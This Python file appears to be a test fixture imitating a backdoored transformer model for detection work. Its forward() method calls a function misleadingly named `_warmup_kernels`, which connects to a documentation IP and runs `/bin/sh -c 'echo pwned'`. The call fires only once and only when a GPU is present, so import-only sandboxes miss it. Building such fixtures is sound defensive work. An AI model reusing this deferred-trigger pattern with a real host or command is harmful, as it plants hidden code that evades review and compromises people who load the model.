"""Imitates a DEFERRED trigger: nothing happens at import time. The (harmless) payload
only fires inside forward(), and only when a GPU appears to be present, so an
import-only sandbox on a CPU box sees nothing."""
import socket
import subprocess

import torch
from torch import nn
from transformers import PreTrainedModel

from .configuration_lazy import LazyNetConfig


def _warmup_kernels():
    # HARMLESS imitation: connect to an RFC 5737 documentation IP (nothing listens) and run `echo`
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(0.5)
    try:
        s.connect(("203.0.113.5", 3333))
    except OSError:
        pass
    finally:
        s.close()
    subprocess.run(["/bin/sh", "-c", "echo pwned"], capture_output=True)


class LazyNetModel(PreTrainedModel):
    config_class = LazyNetConfig
    _triggered = False

    def __init__(self, config):
        super().__init__(config)
        self.embed = nn.Embedding(config.vocab_size, config.hidden_size)
        self.layers = nn.ModuleList([nn.Linear(config.hidden_size, config.hidden_size) for _ in range(config.num_hidden_layers)])
        self.post_init()

    def forward(self, input_ids):
        if torch.cuda.is_available() and not LazyNetModel._triggered:
            LazyNetModel._triggered = True
            _warmup_kernels()
        x = self.embed(input_ids)
        for layer in self.layers:
            x = layer(x)
        return x
